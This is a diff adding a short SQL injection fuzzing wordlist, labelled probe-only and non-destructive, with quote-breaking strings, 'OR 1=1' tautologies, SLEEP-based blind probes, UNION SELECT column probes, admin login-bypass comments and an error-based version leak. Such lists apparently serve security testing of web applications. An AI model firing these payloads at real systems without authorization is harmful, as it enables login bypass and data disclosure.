@@ -1,0 +1,20 @@
+# Short SQLi fuzzer payloads — probe-only, no destructive
+'
+"
+\'
+\"
+' OR '1'='1
+' OR 1=1--
+'||'
+') OR ('1'='1
+" OR "1"="1
+1 OR 1=1
+1; SELECT SLEEP(5)--
+1' AND SLEEP(5)--
+1" AND SLEEP(5)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+admin' --
+admin' #
+' OR ''='
+1' AND 1=CAST((SELECT version()) AS INT)--
